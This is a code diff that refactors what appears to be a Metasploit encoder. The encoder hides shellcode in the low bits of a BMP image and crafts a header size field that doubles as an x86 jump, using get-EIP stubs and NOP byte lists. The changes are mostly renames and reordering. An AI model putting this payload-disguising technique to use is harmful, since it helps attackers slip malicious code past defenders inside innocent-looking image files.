@@ -52,6 +52,20 @@ get_bit:                ; <-----------------------------------------------------
 # calculate the smallest increase of a 32-bit little endian integer which is
 # also a valid x86 jmp opcode of the specified minimum size.
 class SizeCalculator
+
+  BYTE_NOPS = [
+    0x42, # inc edx
+    0x45, # inc ebp
+    0x4a, # dec edx
+    0x4d, # dec ebp
+    0x90, # xchg eax, eax / nop
+    0xf5, # cmc
+    0xf8, # clc
+    0xf9, # stc
+    0xfc, # cld
+    0xfd  # std
+  ]
+
   def initialize(size, minimum_jump)
     @original_size = size
     raise if minimum_jump < 0 || minimum_jump > 0xff
@@ -72,30 +86,30 @@ class SizeCalculator
     size = [ @original_size ].pack('V').unpack('CCCC')
 
     0.upto(2) do |i|
-      b0 = size[i]
-      b1 = size[i + 1]
-      b2 = size[i + 2].to_i
-      b3 = size[i + 3].to_i
-      b4 = size[i + 4].to_i
+      byte_0 = size[i]
+      byte_1 = size[i + 1]
+      byte_2 = size[i + 2].to_i
+      byte_3 = size[i + 3].to_i
+      byte_4 = size[i + 4].to_i
       min_jmp = (@minimum_jump - 5 - i)
 
-      if [b2, b3, b4].inject{ |sum, x| sum + x } > 0  # this jmp would be too large
-        if b0 > 0xfd
+      if byte_2 + byte_3 + byte_4 > 0  # this jmp would be too large
+        if byte_0 > 0xfd
           size = increment_size(size, i)
         end
-        size[i] = round_up_to_nop(b0)
+        size[i] = round_up_to_nop(byte_0)
         next
       end
 
-      if b0 > 0xe9
-        if b0 > 0xfd
+      if byte_0 > 0xe9
+        if byte_0 > 0xfd
           size = increment_size(size, i)
         end
-        size[i] = round_up_to_nop(b0)
+        size[i] = round_up_to_nop(byte_0)
       else
         size[i] = 0xe9
-        b1 = min_jmp if b1 < min_jmp
-        size[i + 1] = b1
+        byte_1 = min_jmp if byte_1 < min_jmp
+        size[i + 1] = byte_1
         return size.pack('CCCC').unpack('V')[0]
       end
     end
@@ -106,24 +120,24 @@ class SizeCalculator
     size = [ @original_size ].pack('V').unpack('CCCC')
 
     0.upto(2) do |i|
-      b0 = size[i]
-      b1 = size[i + 1]
+      byte_0 = size[i]
+      byte_1 = size[i + 1]
       min_jmp = (@minimum_jump - 2 - i)
 
-      if b0 > 0xeb
-        if b0 > 0xfd
+      if byte_0 > 0xeb
+        if byte_0 > 0xfd
           size = increment_size(size, i)
         end
-        size[i] = round_up_to_nop(b0)
+        size[i] = round_up_to_nop(byte_0)
       else
         size[i] = 0xeb
-        if b1 > 0x7f
-          b1 = min_jmp
+        if byte_1 > 0x7f
+          byte_1 = min_jmp
           size = increment_size(size, i + 1)
-        elsif b1 < min_jmp
-          b1 = min_jmp
+        elsif byte_1 < min_jmp
+          byte_1 = min_jmp
         end
-        size[i + 1] = b1
+        size[i + 1] = byte_1
         return size.pack('CCCC').unpack('V')[0]
       end
     end
@@ -158,21 +172,7 @@ class SizeCalculator
   end
 
   def round_up_to_nop(opcode)
-    byte_nops = [
-      0x42, # inc edx
-      0x45, # inc ebp
-      0x4a, # dec edx
-      0x4d, # dec ebp
-      0x90, # xchg eax, eax / nop
-      0xf5, # cmc
-      0xf8, # clc
-      0xf9, # stc
-      0xfc, # cld
-      0xfd  # std
-    ]
-    byte_nops.each do |nop|
-      return nop if opcode <= nop
-    end
+    BYTE_NOPS.find { |nop| opcode <= nop }
   end
 
 end
@@ -278,7 +278,6 @@ class Metasploit4 < Msf::Encoder
     get_eip_nop = Proc.new { |b| [0x90, 0x40 + b.regnum_of([bit_reg, byte_reg, dst_addr_reg, src_addr_reg].sample), 0x48 + b.regnum_of([bit_reg, byte_reg, dst_addr_reg, src_addr_reg].sample)].sample.chr }
     get_eip = Proc.new { |b|
       [
-        Proc.new { |b| get_eip_nop.call(b) + "\xe8\x00\x00\x00\x00" + (0x58 + b.regnum_of(src_addr_reg)).chr },
         Proc.new { |b| "\xe8" + [0, 1].sample.chr + "\x00\x00\x00" + get_eip_nop.call(b) + (0x58 + b.regnum_of(src_addr_reg)).chr },
         Proc.new { |b| "\xe8\xff\xff\xff\xff" + (0xc0 + b.regnum_of([bit_reg, byte_reg, dst_addr_reg, src_addr_reg].sample)).chr + (0x58 + b.regnum_of(src_addr_reg)).chr },
       ].sample.call(b)
@@ -378,24 +377,24 @@ class Metasploit4 < Msf::Encoder
     data
   end
 
-  def validate_dib_header(bmp)
-    dib_header = bmp.read(DIB_HEADER_SIZE)
+  def validate_dib_header(dib_header)
     size, _, _, _, bbp, compression, _, _, _, _, _ = dib_header.unpack('VVVvvVVVVVV')
     raise EncodingError, 'Bad .bmp DIB header, must be 40-byte BITMAPINFOHEADER' if size != DIB_HEADER_SIZE
     raise EncodingError, 'Bad .bmp DIB header, bits per pixel must be must be either 24 or 32' if bbp != 24 && bbp != 32
     raise EncodingError, 'Bad .bmp DIB header, compression can not be used' if compression != 0
-    dib_header
   end
 
   def encode(buf, badchars = nil, state = nil, platform = nil)
     in_bmp = File.open(datastore['BitmapFile'], 'rb')
 
     header = in_bmp.read(BM_HEADER_SIZE)
+    dib_header = in_bmp.read(DIB_HEADER_SIZE)
+    image_data = in_bmp.read
+    in_bmp.close
+
     header, original_size, _, _, original_offset = header.unpack('vVvvV')
     raise EncodingError, 'Bad .bmp header, must be 0x424D (BM)' if header != 0x4d42
-
-    dib_header = validate_dib_header(in_bmp)
-    image_data = in_bmp.read
+    validate_dib_header(dib_header)
 
     lsbs = calc_required_lsbs(buf.length, image_data.length)
 
@@ -413,11 +412,8 @@ class Metasploit4 < Msf::Encoder
     bmp_img = ''
     bmp_img << [0x4d42, details[:new_size], 0, 0, new_offset].pack('vVvvV')
     bmp_img << dib_header
-
     bmp_img << pre_image_data
     bmp_img << stegoify(buf, image_data, lsbs)
-
-    in_bmp.close
     bmp_img
   end
 end
